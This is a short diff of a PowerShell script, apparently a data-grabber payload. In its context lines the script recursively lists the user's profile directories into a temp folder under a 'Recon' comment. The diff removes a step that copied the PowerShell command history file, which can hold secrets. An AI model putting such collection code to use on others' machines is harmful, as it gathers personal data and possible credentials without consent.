@@ -24,11 +24,6 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
-# Powershell history
-Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
-
-############################################################################################################################################################
-
 function Get-fullName {
 
     try {
